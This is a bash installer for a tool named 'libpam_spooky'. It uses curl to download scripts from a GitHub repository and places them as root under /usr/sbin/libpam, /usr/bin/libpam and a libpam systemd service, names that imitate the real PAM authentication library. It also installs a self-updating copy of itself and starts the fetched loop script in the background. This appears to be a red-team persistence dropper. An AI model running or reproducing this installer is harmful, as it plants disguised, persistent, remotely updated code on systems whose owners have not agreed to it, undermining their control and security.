#!/bin/bash
# libpam_spooky installer
# Robert Gray <rpg4231@rit.edu>

curl "https://raw.githubusercontent.com/FlamingSpork/libpam_spooky/main/overwrite_once.sh" > /usr/sbin/libpam
chmod +x /usr/sbin/libpam
curl "https://raw.githubusercontent.com/FlamingSpork/libpam_spooky/main/loop_linux.sh" > /usr/bin/libpam
chmod +x /usr/bin/libpam
curl "https://raw.githubusercontent.com/FlamingSpork/libpam_spooky/main/libpam.service" > /etc/systemd/system/libpam.service
curl "https://raw.githubusercontent.com/FlamingSpork/libpam_spooky/main/install.sh" > /usr/bin/libpam_update.sh
chmod +x /usr/bin/libpam_update.sh

/bin/bash /usr/bin/libpam &
exit 0
